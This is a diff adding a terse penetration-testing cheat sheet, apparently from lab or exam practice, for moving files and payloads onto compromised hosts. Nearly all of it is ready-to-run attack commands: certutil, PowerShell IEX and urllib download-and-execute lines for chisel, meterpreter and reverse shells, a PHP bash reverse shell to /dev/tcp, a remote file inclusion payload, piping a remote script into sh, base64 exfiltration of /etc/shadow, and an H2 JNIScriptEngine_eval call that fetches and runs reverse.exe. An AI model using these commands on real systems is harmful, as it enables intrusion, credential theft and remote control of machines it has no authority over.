@@ -1,0 +1,93 @@
+impacket-smbserver smbfolder $(pwd)
+copy \\192.168.119.137\smbfolder\chisel.exe
+
+#powershell
+powershell iwr http://192.168.45.248/chisel.exe -o chisel.exe
+
+https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/
+#certutil
+certutil.exe -f -urlcache -split http://192.168.49.142/priv.msi
+
+
+#####base64
+
+#kali
+base64 -w0 1518.c > base
+#john
+base64 -d raptor.c > raptorz -i
+
+#PYTHON SMB SERVER
+
+python /home/kali/.local/pipx/venvs/autorecon/bin/smbserver.py Lab "/mnt/VILEROZE/10.11.1.35/"
+
+copy \\192.168.119.243\Lab\test.txt
+
+python2 /home/kali/.local/pipx/venvs/autorecon/bin/smbserver.py Lab "/mnt/VILEROZE/10.11.1.128/"
+
+C:\Users\Administrator\Desktop\copy proof.txt \\192.168.119.157\Lab
+
+#Python HTTP File Download
+If you have remote command execution on a box with python - something like this should do the trick:
+
+python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/meterpreter', '/tmp/meterpreter');"
+
+or if it is a Windows box, it's not much different:
+C:\Python2.7\python.exe -c "import urllib; f = urllib.URLopener(); f.retrieve('http://<attacker ip>/rs_powershell.exe', '/temp/rs_powershell.exe');"
+
+
+#PHP WRAPPER + PYTHON HTTP SERVER
+
+python -m http.server
+
+cat php-oneline-bash-shell.php  
+   
+<?php echo shell_exec("/bin/bash -i >& /dev/tcp/192.168.119.243/80 0>&1");?>
+
+http://10.11.1.35/section.php?page=data:text/plain,<?php include("http://192.168.119.243:8000/php-oneline-bash-shell.php");?>
+
+
+#CURL
+
+curl "http://192.168.119.243:8000/text.txt" -o test.txt
+
+
+#NETCAT
+
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+
+#POWERSHELL
+Invoke-WebRequest -Uri "http://10.10.14.9:8000/Get-LAPSPasswords.ps1" -OutFile Get-LAPSPasswords.ps1
+
+"IEX(New-Object Net.Webclient).downloadString('http://192.168.119.215:8000/Invoke-MS16032.ps1')"
+
+powershell.exe -ep bypass -File \\10.10.14.30\optimum\KE\Invoke-MS16-032.ps1
+
+
+
+#BASE64
+
+# receiving host
+nc -lp 4443 | base64 -d > loot.txt
+
+# sender host
+base64 /etc/shadow > /dev/tcp/10.10.10.123/4443
+
+
+
+cat proof.txt
+1f88aa9e73f267356f033a42d9320b50
+
+
+
+###TFTPD
+
+https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
+
+#JS CALL METHOD
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.142\\smbfolder\\reverse.exe c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+#run payload
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
+
